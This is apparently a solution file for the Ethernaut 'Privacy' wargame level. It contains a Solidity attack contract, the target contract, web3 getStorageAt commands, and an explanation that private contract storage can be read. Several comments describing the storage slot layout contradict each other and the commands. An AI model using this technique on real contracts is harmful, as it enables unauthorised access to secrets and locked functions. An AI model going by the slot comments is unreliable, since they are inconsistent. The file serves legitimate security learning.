// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackPrivacy {
    Privacy public target;

    constructor(address _target) {
        target = Privacy(_target);
    }

    function attack(bytes32 _slotValue) public {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}

/*
for return slot 0 > locked value
  await web3.eth.getStorageAt(contract.address, 0, console.log) 
  > 0x0000000000000000000000000000000000000000000000000000000000000001
for return slot 6 > empty
  await web3.eth.getStorageAt(contract.address, 6, console.log) 
  > 0x0000000000000000000000000000000000000000000000000000000000000000
for return slot 5 > data[2] value
  await web3.eth.getStorageAt(contract.address, 4, console.log)
  > 0xfa13495afbaeec005765b15b5a219fc0c6c0412eb47a4a99370765d126bddae2
*/

contract Privacy {
    // slot 0 - 1 byte
    bool public locked = true;
    // slot 1 - 32 byte
    uint256 public ID = block.timestamp;
    // slot 2 - 8 bit
    uint8 private flattening = 10;
    // slot 3 - 8 bit
    uint8 private denomination = 255;
    // slot 4 - 16 bit
    uint16 private awkwardness = uint16(block.timestamp);
    // slot 3,4,5 - 32 byte each
    // create array that have 3 slots
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        /*
      The answer is slot (5), reason being is
      [3] start from 0, making the below [2] actaully three
      */
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

/*
Nothing in the ethereum blockchain is private. 
The keyword private is merely an artificial construct of the Solidity language. 
Web3's getStorageAt(...) can be used to read anything from storage. 
It can be tricky to read what you want though, since several optimization rules 
and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. 
For more, check out this excellent article by "Darius": How to read Ethereum contract storage (https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)
*/
